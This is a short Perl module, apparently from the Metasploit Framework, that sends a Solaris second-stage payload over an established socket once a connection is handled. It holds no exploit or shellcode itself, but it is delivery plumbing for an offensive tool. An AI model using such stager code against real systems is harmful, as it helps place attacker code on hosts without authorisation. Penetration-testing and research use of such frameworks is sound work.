package Msf::PayloadComponent::SolarisStagePayload;
use strict;
use vars qw{@ISA};

sub import {
  my $class = shift;
  @ISA = ();
  foreach (@_) {
    eval("use $_");
    unshift(@ISA, $_);
  }
}

sub SolarisStagePayload {
  my $self = shift;
  return($self->_Info->{'SolarisStagePayload'});
  
}

sub HandleConnection {
  my $self = shift;
  $self->SUPER::HandleConnection;
  my $sock = $self->SocketOut;
  my $blocking = $sock->blocking;
  $sock->blocking(1);

  my $payload = $self->BuildSolaris($self->SolarisStagePayload);

  $self->PrintLine('[*] Sending Stage (' . length($payload) . ' bytes)');
  $sock->send($payload);
  $self->PrintDebugLine(3, '[*] Stage Sent.');

  $sock->blocking($blocking);


}

1;
